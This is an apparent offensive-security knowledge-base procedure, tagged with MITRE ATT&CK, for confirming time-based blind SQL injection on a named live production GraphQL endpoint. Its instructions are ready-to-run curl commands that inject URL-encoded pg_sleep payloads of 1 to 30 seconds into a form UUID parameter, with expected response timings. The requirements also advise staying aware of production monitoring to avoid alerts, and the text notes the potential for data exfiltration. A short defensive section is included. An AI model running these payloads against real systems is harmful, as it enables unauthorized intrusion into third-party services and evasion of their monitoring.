---
tags:
  - sqli
  - production
  - blind-injection
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/time]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/time-curl-prod-1s]]'
  - '[[commands/time-curl-prod-5s]]'
  - '[[commands/time-curl-prod-10s]]'
  - '[[commands/time-curl-prod-30s]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:00.316Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 97ea46e8-5284-4106-b798-a8000dd87c39
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Verify-SQL-Injection-on-Production

## Summary

This procedure verifies SQL injection on a live GraphQL endpoint using time-based blind techniques with pg_sleep payloads of varying durations to measure response delays, confirming arbitrary SQL execution without data leakage.

## Description

Applied to production environments like hackerone.com/graphql, payloads inject into embedded_submission_form_uuid to execute in secure PostgreSQL schemas. Varying sleep times (1s, 5s, 10s, 30s) differentiate from network latency. Prerequisites: Direct network access to the endpoint. Outcomes: Timed responses proving exploitability, with potential for data exfiltration in real attacks.

## Requirements

1. Network access to production /graphql endpoint
2. curl and time utilities
3. Awareness of production monitoring to avoid alerts

## Defense

Defensive measures and detection strategies:

- Deploy rate limiting and anomaly detection on response times
- Use PostgreSQL extensions like pgBadger for query delay logging
- Implement GraphQL schema validation to reject suspicious parameters

## Objectives

1. Confirm injection success via measurable delays
2. Assess impact on secure vs. public schemas
3. Evaluate production safeguards like timeouts

## Instructions

### Step 1: Test Short Delay Payload

**Context**: Start with 1-second sleep to baseline delay.

**Command** ([[commands/time-curl-prod-1s]]):

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%281%29%3B--%27
```

> Injects pg_sleep(1). Expected output: ~1.631s response time, {} JSON.

### Step 2: Escalate to Longer Delays

**Context**: Use 5s, 10s, and 30s to confirm pattern.

**Command** ([[commands/time-curl-prod-5s]]):

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%285%29%3B--%27
```

> Expected output: ~5.726s. Repeat with [[commands/time-curl-prod-10s]] (~10.557s) and [[commands/time-curl-prod-30s]] (~30s+).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/time-curl-prod-1s]]
- [[commands/time-curl-prod-5s]]
- [[commands/time-curl-prod-10s]]
- [[commands/time-curl-prod-30s]]

## Tools Used

- [[tools/curl]]
- [[tools/time]]

## Tags

- sqli
- production
- blind-injection
